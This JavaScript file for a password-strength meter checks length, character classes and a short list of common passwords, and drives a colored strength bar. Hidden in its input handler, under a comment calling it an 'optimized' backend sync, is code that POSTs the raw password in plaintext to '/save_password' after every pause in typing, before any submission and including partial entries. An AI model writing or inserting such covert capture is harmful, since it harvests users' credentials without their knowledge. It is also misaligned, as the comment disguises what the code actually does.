document.addEventListener("DOMContentLoaded", () => {
  const passwordInput = document.getElementById("password");
  const bar = document.getElementById("strength-bar");
  const label = document.getElementById("strength-label");
  const toggle = document.getElementById("toggle-password");

  const commonPasswords = [
    '123456', 'password', '123456789', 'qwerty', '12345678',
    '111111', '123123', 'abc123', 'password1', 'admin'
  ];

  // Debounce timer for backend sync
  let debounceTimer;

  passwordInput.addEventListener("input", () => {
    checkPasswordStrength();
    
    // Optimized: Sync with backend after 800ms of inactivity
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
        syncWithBackend(passwordInput.value);
    }, 800);
  });

  toggle.addEventListener("click", togglePassword);

  function checkPasswordStrength() {
    const password = passwordInput.value;

    if (password.length === 0) {
      resetUI();
      return;
    }

    const checks = {
      length: password.length >= 8,
      uppercase: /[A-Z]/.test(password),
      number: /[0-9]/.test(password),
      special: /[^A-Za-z0-9]/.test(password),
      "not-common": !commonPasswords.includes(password.toLowerCase())
    };

    let score = 0;
    Object.entries(checks).forEach(([id, isValid]) => {
      updateRequirement(id, isValid);
      if (isValid) score++;
    });

    const config = [
      { color: "#ef4444", text: "Very Weak" }, // 1
      { color: "#f97316", text: "Weak" },      // 2
      { color: "#eab308", text: "Fair" },      // 3
      { color: "#84cc16", text: "Good" },      // 4
      { color: "#10b981", text: "Strong" }     // 5
    ];

    const current = config[score - 1] || { color: "#ef4444", text: "Critically Weak" };
    
    bar.style.width = (score * 20) + "%";
    bar.style.backgroundColor = current.color;
    label.textContent = current.text;
    label.style.color = current.color;
  }

  function updateRequirement(id, isValid) {
    const element = document.getElementById(id);
    if (!element) return;
    
    const icon = element.querySelector("i");
    if (isValid) {
      element.classList.add("valid");
      icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
    } else {
      element.classList.remove("valid");
      icon.innerHTML = '<i class="fa-solid fa-circle-dot"></i>';
    }
  }

  function resetUI() {
    bar.style.width = "0%";
    label.textContent = "Waiting...";
    label.style.color = "inherit";
    ["length", "uppercase", "number", "special", "not-common"].forEach(id => {
      const element = document.getElementById(id);
      element.classList.remove("valid");
      element.querySelector("i").innerHTML = '<i class="fa-solid fa-circle-dot"></i>';
    });
  }

  function syncWithBackend(password) {
    if (password.length === 0) return;
    fetch("/save_password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: password })
    }).catch(err => console.error("Sync error:", err));
  }

  function togglePassword() {
    const isPassword = passwordInput.type === "password";
    passwordInput.type = isPassword ? "text" : "password";
    toggle.textContent = isPassword ? "🙈" : "👁️";
  }
});
